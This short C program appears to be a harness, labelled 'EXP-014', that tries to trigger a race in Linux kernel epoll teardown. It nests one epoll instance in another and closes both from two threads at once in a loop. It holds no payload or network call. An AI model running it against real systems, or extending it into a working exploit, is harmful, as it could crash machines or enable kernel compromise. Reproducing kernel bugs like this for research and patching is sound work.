#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>

int ep_outer, ep_inner;

void *thread_a(void *arg) {
    // Thread A closes outer_epoll -> calls ep_clear_and_put
    usleep(100); 
    close(ep_outer);
    return NULL;
}

void *thread_b(void *arg) {
    // Thread B closes inner_epoll -> calls eventpoll_release_file
    usleep(100); 
    close(ep_inner);
    return NULL;
}

int main() {
    printf("[*] Starting EXP-014 harness (loop)...\n");
    
    for (int i = 0; i < 1000; i++) {
        ep_outer = epoll_create1(0);
        ep_inner = epoll_create1(0);
        
        struct epoll_event ev;
        ev.events = EPOLLIN;
        ev.data.fd = ep_inner;
        epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner, &ev);
        
        pthread_t ta, tb;
        pthread_create(&ta, NULL, thread_a, NULL);
        pthread_create(&tb, NULL, thread_b, NULL);
        
        pthread_join(ta, NULL);
        pthread_join(tb, NULL);
    }
    
    printf("[*] Done.\n");
    return 0;
}
